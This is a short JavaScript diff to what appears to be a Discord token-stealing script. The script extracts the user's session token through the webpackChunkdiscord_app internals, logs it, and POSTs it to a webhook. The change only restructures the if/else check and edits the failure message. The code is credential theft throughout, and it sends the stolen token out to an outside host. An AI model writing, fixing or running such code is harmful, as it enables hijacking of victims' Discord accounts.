@@ -7,7 +7,9 @@ var token = (webpackChunkdiscord_app.push([[''], {}, e => {
 
 console.log("Token:", token);
 
-if (token) {
+if (!token) {
+  console.log("Token extraction failed or token is undefined.");
+} else {
   fetch(webhook, {
     method: 'POST',
     headers: {
@@ -20,6 +22,4 @@ if (token) {
   .then(response => response.json())
   .then(data => console.log('Success:', data))
   .catch((error) => console.error('Error:', error));
-} else {
-  console.log("Token not found or undefined.");
 }
